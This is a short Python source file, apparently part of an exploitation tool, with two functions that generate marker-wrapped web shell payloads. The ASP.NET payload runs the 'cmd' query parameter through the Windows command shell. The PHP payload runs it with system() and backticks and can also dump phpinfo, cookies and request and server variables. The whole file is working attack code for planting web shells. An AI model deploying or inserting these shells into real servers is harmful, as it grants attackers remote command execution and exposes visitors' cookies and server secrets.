
def get_aspnet_payload(marker) -> str:
  return f"""\
{marker}<%
Dim objShell = Server.CreateObject("WSCRIPT.SHELL")
Dim command = Request.QueryString("cmd")

Dim comspec = objShell.ExpandEnvironmentStrings("%comspec%")

Dim objExec = objShell.Exec(comspec & " /c " & command)
Dim output = objExec.StdOut.ReadAll()
%><%= output %>{marker}
"""

def get_php_payload(marker) -> str:
  return f"""\
{marker}<?php
if ($_GET['cmd'] == '_show_phpinfo') {{
  phpinfo();
}} else if ($_GET['cmd'] == '_show_cookie') {{
  var_dump($_COOKIE);
}} else if ($_GET['cmd'] == '_show_get') {{
  var_dump($_GET);
}} else if ($_GET['cmd'] == '_show_post') {{
  var_dump($_POST);
}} else if ($_GET['cmd'] == '_show_server') {{
  var_dump($_SERVER);
}} else {{
  system($_GET['cmd']) || print `{{$_GET['cmd']}}`;
}}
?>{marker}
"""